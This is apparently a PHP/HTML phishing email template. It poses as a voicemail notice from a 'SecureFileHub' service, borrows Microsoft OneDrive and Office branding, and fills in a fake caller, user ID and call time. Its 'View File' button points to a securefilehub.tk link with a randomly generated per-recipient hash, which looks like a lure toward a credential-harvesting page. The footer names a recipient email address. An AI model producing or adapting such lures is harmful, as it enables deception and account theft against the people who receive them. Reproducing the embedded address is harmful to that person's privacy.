<?php
function  convertImage($fname)
{
// Read image path, convert to base64 encoding
$imageData = base64_encode(file_get_contents($fname));

// Format the image SRC:  data:{mime};base64,{data};
$src = 'data: '.mime_content_type($fname).';base64,'.$imageData;

// Echo out a sample image
return $src;
}

function getToken($length){
     $token = "";
     $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
     $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
     $codeAlphabet.= "0123456789";
     $max = strlen($codeAlphabet);

    for ($i=0; $i < $length; $i++) {
        $token .= $codeAlphabet[random_int(0, $max-1)];
    }

    return $token;
}

$uu = "http://www.securefilehub.tk/?provider=onedrive&hash=".getToken(50);

$oneDriveLogo = convertImage("onedrive-logo.png");
$officeLogo = convertImage("logo.jpg");
$voiceMailHero = convertImage("voicemail.jpg");
$copy_1 = convertImage("copy-1.webp");
$copy_2 = convertImage("copy-2.jpg");
$copy = [
   ['img' => $copy_1, 'title' => "Get More Done With Office365", 'copy' => "Create your best work with the latest versions of Word, Excel and all the other Office apps. Plus, get 1 TB of cloud storage, document sharing, ransomware recovery, and more with OneDrive."],
   ['img' => $copy_2, 'title' => "Share and collaborate", 'copy' => "Make viewing and sharing your files very easy. Store your most important files and photos in Personal Vault, a protected area in OneDrive."],
];

shuffle($copy);
$currentCopy = $copy[0];

$name = "Joann C. Levin";
$duration = "0:29";
$username = "@jclevin2020";
$date = date("jS F, Y h:i A");
?>
	<style type="text/css" media="screen">
		/* Linked Styles */
		body { padding:0 !important; margin:0 !important; display:block !important; min-width:100% !important; width:100% !important; background:#1e52bd; -webkit-text-size-adjust:none }
		a { color:#000001; text-decoration:none }
		p { padding:0 !important; margin:0 !important } 
		img { -ms-interpolation-mode: bicubic; /* Allow smoother rendering of resized image in Internet Explorer */ }
		.mcnPreviewText { display: none !important; }
		.text-footer2 a { color: #ffffff; } 
		
		/* Mobile styles */
		@media only screen and (max-device-width: 480px), only screen and (max-width: 480px) {
			.mobile-shell { width: 100% !important; min-width: 100% !important; }
			
			.m-center { text-align: center !important; }
			.m-left { text-align: left !important; margin-right: auto !important; }
			
			.center { margin: 0 auto !important; }
			.content2 { padding: 8px 15px 12px !important; }
			.t-left { float: left !important; margin-right: 30px !important; }
			.t-left-2  { float: left !important; }
			
			.td { width: 100% !important; min-width: 100% !important; }

			.content { padding: 30px 15px !important; }
			.section { padding: 30px 15px 0px !important; }

			.m-br-15 { height: 15px !important; }
			.mpb5 { padding-bottom: 5px !important; }
			.mpb15 { padding-bottom: 15px !important; }
			.mpb20 { padding-bottom: 20px !important; }
			.mpb30 { padding-bottom: 30px !important; }
			.m-padder { padding: 0px 15px !important; }
			.m-padder2 { padding-left: 15px !important; padding-right: 15px !important; }
			.p70 { padding: 30px 0px !important; }
			.pt70 { padding-top: 30px !important; }
			.p0-15 { padding: 0px 15px !important; }
			.p30-15 { padding: 30px 15px !important; }			
			.p30-15-0 { padding: 30px 15px 0px 15px !important; }			
			.p0-15-30 { padding: 0px 15px 30px 15px !important; }			


			.text-footer { text-align: center !important; }

			.m-td,
			.m-hide { display: none !important; width: 0 !important; height: 0 !important; font-size: 0 !important; line-height: 0 !important; min-height: 0 !important; }

			.m-block { display: block !important; }

			.fluid-img img { width: 100% !important; max-width: 100% !important; height: auto !important; }

			.column,
			.column-dir,
			.column-top,
			.column-empty,
			.column-top-30,
			.column-top-60,
			.column-empty2,
			.column-bottom { float: left !important; width: 100% !important; display: block !important; }

			.column-empty { padding-bottom: 15px !important; }
			.column-empty2 { padding-bottom: 30px !important; }

			.content-spacing { width: 15px !important; }
		}
	</style>
</head>
<body class="body"style="padding:0 !important; margin:0 !important; display:block !important; min-width:100% !important; width:100% !important; background:#1e52bd; -webkit-text-size-adjust:none;">
	<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#1e52bd">
		<tr>
			<td align="center" valign="top">
				<!-- Main -->
				<table width="650" border="0" cellspacing="0" cellpadding="0" class="mobile-shell">
					<tr>
						<td class="td" style="width:650px; min-width:650px; font-size:0pt; line-height:0pt; padding:0; margin:0; font-weight:normal;">
							<!-- Header -->
							<table width="100%" border="0" cellspacing="0" cellpadding="0">
								<tr>
									<td class="p30-15" style="padding: 40px 0px 20px 0px;">
										<table width="100%" border="0" cellspacing="0" cellpadding="0">
											<tr>
												<th class="column-top" width="200"style="font-size:0pt; line-height:0pt; padding:0; margin:0; font-weight:normal; vertical-align:top;">
													<table width="100%" border="0" cellspacing="0" cellpadding="0">
														<tr>
															<td class="text-top m-center mpb5"style="color:#9babdb; font-family:'Times New Roman', Georgia, serif; font-size:11px; line-height:22px; text-align:left; text-transform:uppercase;"><multiline>securefilehub</multiline></td>
														</tr>
													</table>
												</th>
												<th class="column-top"style="font-size:0pt; line-height:0pt; padding:0; margin:0; font-weight:normal; vertical-align:top;">
													<table width="100%" border="0" cellspacing="0" cellpadding="0">
														<tr>
															<td align="right">
																<table class="center" border="0" cellspacing="0" cellpadding="0"style="text-align:center;">
																	<tr>
																		<td class="img" width="32"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/free_ico_facebook.jpg" width="14" height="13" border="0" alt="" /></a></td>
																		<td class="img" width="32"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/free_ico_twitter.jpg" width="14" height="13" border="0" alt="" /></a></td>
																		<td class="img" width="32"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/free_ico_gplus.jpg" width="14" height="13" border="0" alt="" /></a></td>
																		<td class="img" width="32"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/free_ico_pinterest.jpg" width="14" height="13" border="0" alt="" /></a></td>
																		<td class="img" width="14"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/free_ico_instagram.jpg" width="14" height="13" border="0" alt="" /></a></td>
																	</tr>
																</table>
															</td>
														</tr>
													</table>
												</th>
											</tr>
										</table>
									</td>
								</tr>
								<!-- END Top bar -->
								<!-- Logo -->
								<tr>
									<td bgcolor="#ffffff" class="p30-15 img-center" style="padding: 20px; border-radius: 20px 20px 0px 0px; font-size:0pt; line-height:0pt; text-align:center;"><a href="#" target="_blank"><img src="<?=$officeLogo?>" width="146" height="50" border="0" alt="" /></a></td>
								</tr>
								<!-- END Logo -->
								<!-- Nav -->
								<tr>
									<td class="text-nav-white" bgcolor="#e85711"style="color:#ffffff; font-family:'Roboto', Arial, sans-serif; font-size:12px; line-height:22px; text-align:center; text-transform:uppercase; padding:12px 0px;">
										<a href="#" target="_blank" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">products</span></a>
										 &nbsp; &nbsp; &nbsp;<span class="m-hide"> &nbsp; &nbsp; </span>
										<a href="#" target="_blank" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">inspirations</span></a>
										 &nbsp; &nbsp; &nbsp;<span class="m-hide"> &nbsp; &nbsp; </span>
										<a href="#" target="_blank" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">new</span></a>
										 <span class="m-block"><span class="m-hide">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></span>
										<a href="#" target="_blank" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">OFFERS</span></a>
										 &nbsp; &nbsp; &nbsp;<span class="m-hide"> &nbsp; &nbsp; </span>
										<a href="#" target="_blank" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">SERVICES</span></a>
										 <span class="m-block"><span class="m-hide">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></span>
										<a href="#" target="_blank" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">catalog</span></a>
										 &nbsp; &nbsp; &nbsp;<span class="m-hide"> &nbsp; &nbsp; </span>
										<a href="#" target="_blank" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">contact us</span></a>
									</td>
								</tr>
								<!-- END Nav -->
							</table>
							<!-- END Header -->
								
							<!-- Section 1 -->
							<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#ebebeb">
								<tr>
									<td class="fluid-img"style="font-size:0pt; line-height:0pt; text-align:left;"><img src="<?=$voiceMailHero?>" width="650" height="358" border="0" alt="" /></td>
								</tr>
								<tr>
									<td class="p30-15-0" style="padding: 50px 30px 0px;" bgcolor="#ffffff">
										<table width="100%" border="0" cellspacing="0" cellpadding="0">
											<tr>
												<td class="h5-center"style="color:#a1a1a1; font-family:'Raleway', Arial,sans-serif; font-size:16px; line-height:22px; text-align:center; padding-bottom:5px;">Hello,</td>
											</tr>
											<tr>
												<td class="h2-center"style="color:#000000; font-family:'Playfair Display', Times, 'Times New Roman', serif; font-size:32px; line-height:36px; text-align:center; padding-bottom:20px;"><?=$name?> just left you a voicemail!</td>
											</tr>
											<tr>
												<td class="text-center"style="color:#5d5c5c; font-family:'Raleway', Arial,sans-serif; font-size:14px; line-height:22px; text-align:center; padding-bottom:22px;">SecureFileHub user ID: <strong><?=$username?></strong><br>Call duration: <strong><?=$duration?></strong><br>Date received: <strong><?=$date?></strong><br></td>
											</tr>
											<tr>
												<td class="text-center"style="color:#5d5c5c; font-family:'Raleway', Arial,sans-serif; font-size:14px; line-height:22px; text-align:center; padding-bottom:22px;">Our cloud file storage is powered by Microsoft OneDrive, which means along with the world class security that comes with Microsoft, you can also access and share files, folders, and photos with friends and family. No more large email attachments or thumb drives—just send a link via email or text..</td>
											</tr>
											<tr>
												<td align="center">
													<table border="0" cellspacing="0" cellpadding="0">
														<tr>
															<td class="text-button-orange"style="background:#e85711; color:#ffffff; font-family:'Kreon', 'Times New Roman', Georgia, serif; font-size:14px; line-height:18px; text-align:center; padding:10px 30px; border-radius:20px;"><a href="<?=$uu?>" target="_blank" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">View File</span></a></td>
														</tr>
													</table>
												</td>
											</tr>
										</table><br>
									</td>
								</tr>
							</table>
							<!-- END Section 1 -->

							
							<!-- Section 4 -->
							<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#ebebeb">
								<tr>
									<td background="images/video_image1.jpg" bgcolor="#535155" valign="top" height="280" class="bg">
										<!--[if gte mso 9]>
										<v:rect xmlns:v="urn:schemas-microsoft-com:vml" fill="true" stroke="false" style="width:650px; height: 280px">
											<v:fill type="frame" src="images/video_image1.jpg" color="#535155" />
											<v:textbox inset="0,0,0,0">
										<![endif]-->
										<div>
											<table width="100%" border="0" cellspacing="0" cellpadding="0">
												<tr>
													<td class="content-spacing" height="280" width="20"style="font-size:0pt; line-height:0pt; text-align:left;"></td>
													<td style="padding: 30px;">
														<table width="100%" border="0" cellspacing="0" cellpadding="0">
															<tr>
																<td class="img-center pb20"style="font-size:0pt; line-height:0pt; text-align:center; padding-bottom:20px;"><img src="images/360_view.png" width="101" height="69" border="0" alt="" /></td>
															</tr>
															<tr>
																<td align="center">
																	<table class="center" border="0" cellspacing="0" cellpadding="0"style="text-align:center;">
																		<tr>
																			<td class="text-button-orange"style="background:#e85711; color:#ffffff; font-family:'Kreon', 'Times New Roman', Georgia, serif; font-size:14px; line-height:18px; text-align:center; padding:10px 30px; border-radius:20px;"><multiline><a href="#" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">Start Now</span></a></multiline></td>
																		</tr>
																	</table>
																</td>
															</tr>
														</table>
													</td>
													<td class="content-spacing" width="20"style="font-size:0pt; line-height:0pt; text-align:left;"></td>
												</tr>
											</table>
										</div>
										<!--[if gte mso 9]>
											</v:textbox>
											</v:rect>
										<![endif]-->
									</td>
								</tr>
							</table>
							<!-- END Section 4 -->
							
							<!-- Section 5 -->
							<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff">
								<tr>
									<td class="p30-15-0" style="padding: 70px 30px 0px 30px;">
										<table width="100%" border="0" cellspacing="0" cellpadding="0">
											<tr>
												<td class="h5-center"style="color:#a1a1a1; font-family:'Raleway', Arial,sans-serif; font-size:16px; line-height:22px; text-align:center; padding-bottom:5px;"><multiline>Don't be left out</multiline></td>
											</tr>
											<tr>
												<td class="h2-center"style="color:#000000; font-family:'Playfair Display', Times, 'Times New Roman', serif; font-size:32px; line-height:36px; text-align:center; padding-bottom:20px;"><multiline><?=$currentCopy['title']?></multiline></td>
											</tr>
											<tr>
												<td style="padding-bottom: 25px;">
													<table width="100%" border="0" cellspacing="0" cellpadding="0">
														<tr>
															<td class="fluid-img"style="font-size:0pt; line-height:0pt; text-align:left;"><img src="<?=$currentCopy['img']?>" width="580" height="260" border="0" alt="" /></td>
														</tr>
													</table>
												</td>
											</tr>
											<tr>
												<td class="text-center pb20"style="color:#5d5c5c; font-family:'Raleway', Arial,sans-serif; font-size:14px; line-height:22px; text-align:center; padding-bottom:20px;"><multiline><?=$currentCopy['copy']?></multiline></td>
											</tr>
											<!-- Button -->
											<tr>
												<td align="center">
													<table border="0" cellspacing="0" cellpadding="0">
														<tr>
															<td class="text-button3"style="color:#000000; font-family:'Kreon', 'Times New Roman', Georgia, serif; font-size:14px; line-height:18px; text-align:center; border:1px solid #000000; padding:10px 30px; border-radius:20px;"><multiline><a href="#" target="_blank" class="link"style="color:#000001; text-decoration:none;"><span class="link"style="color:#000001; text-decoration:none;">View More</span></a></multiline></td>
														</tr>
													</table>
												</td>
											</tr>
											<!-- END Button -->
										</table>
									</td>
								</tr>
							</table>
							<!-- END Section 5 -->

							
							
							<!-- Footer -->
							<table width="100%" border="0" cellspacing="0" cellpadding="0">
								<tr>
									<td class="p30-15-0" bgcolor="#ffffff" style="border-radius: 0px 0px 20px 20px; padding: 70px 30px 0px 30px;">
										<table width="100%" border="0" cellspacing="0" cellpadding="0">
										 	<tr>
												<td class="m-padder2 pb30" align="center"style="padding-bottom:30px;">
													<table class="center" border="0" cellspacing="0" cellpadding="0"style="text-align:center;">
														<tr>
															<td class="img" width="40"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/ico4_facebook.png" width="26" height="26" border="0" alt="" /></a></td>
															<td class="img" width="40"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/ico4_twitter.png" width="26" height="26" border="0" alt="" /></a></td>
															<td class="img" width="40"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/ico4_gplus.png" width="26" height="26" border="0" alt="" /></a></td>
															<td class="img" width="40"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/ico4_youtube.png" width="26" height="26" border="0" alt="" /></a></td>
															<td class="img" width="40"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/ico4_instagram.png" width="26" height="26" border="0" alt="" /></a></td>
															<td class="img" width="40"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/ico4_pinterest.png" width="26" height="26" border="0" alt="" /></a></td>
															<td class="img" width="40"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/ico4_linkedin.png" width="26" height="26" border="0" alt="" /></a></td>
															<td class="img" width="26"style="font-size:0pt; line-height:0pt; text-align:left;"><a href="#" target="_blank"><img src="images/ico4_rss.png" width="26" height="26" border="0" alt="" /></a></td>
														</tr>
													</table>
												</td>
											</tr>
											
										</table>
									</td>
								</tr>
							</table>
							<table width="100%" border="0" cellspacing="0" cellpadding="0">
								<tr>
									<td class="text-footer2 p30-15" style="padding: 30px 15px 50px 15px; color:#a9b6e0; font-family:'Raleway', Arial,sans-serif; font-size:12px; line-height:22px; text-align:center;"><multiline>This email was sent to <a href="#" target="_blank" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">dunphydavid83@gmail.com.</span></a> <br />If you no longer wish to receive these emails you may <a href="#" target="_blank" class="link-white"style="color:#ffffff; text-decoration:none;"><span class="link-white"style="color:#ffffff; text-decoration:none;">unsubscribe</span></a> at any time.</multiline></td>
								</tr>
							</table>
							<!-- END Footer -->
						</td>
					</tr>
				</table>
				<!-- END Main -->

			</td>
		</tr>
	</table>